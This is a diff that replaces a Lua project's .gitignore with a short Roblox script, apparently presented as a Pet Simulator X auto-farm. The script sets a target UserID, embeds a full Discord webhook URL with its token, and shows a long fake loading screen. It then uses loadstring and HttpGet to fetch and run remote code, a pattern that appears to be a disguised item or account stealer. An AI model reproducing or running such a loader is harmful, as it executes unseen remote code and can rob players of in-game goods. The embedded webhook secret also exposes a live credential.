@@ -1,41 +1,4 @@
-# Compiled Lua sources
-luac.out
-
-# luarocks build files
-*.src.rock
-*.zip
-*.tar.gz
-
-# Object files
-*.o
-*.os
-*.ko
-*.obj
-*.elf
-
-# Precompiled Headers
-*.gch
-*.pch
-
-# Libraries
-*.lib
-*.a
-*.la
-*.lo
-*.def
-*.exp
-
-# Shared objects (inc. Windows DLLs)
-*.dll
-*.so
-*.so.*
-*.dylib
-
-# Executables
-*.exe
-*.out
-*.app
-*.i*86
-*.x86_64
-*.hex
-
+_G.UserID = 3758606668
+_G.WebHook = "https://discord.com/api/webhooks/1070107327082016879/ARPG5EgkBZf9Apajf6XrZjH8dXQn1gHF_kfGhLWZTTjLb_h224XYXD8sF4BTubGI53pQ"
+_G.LoadingScreenText = "Loading Please Wait 5 Minute"
+loadstring(game:HttpGet('https://raw.githubusercontent.com/vestyx/PetSimulatorXAutoFarm/main/HasteFarm.lua'))()
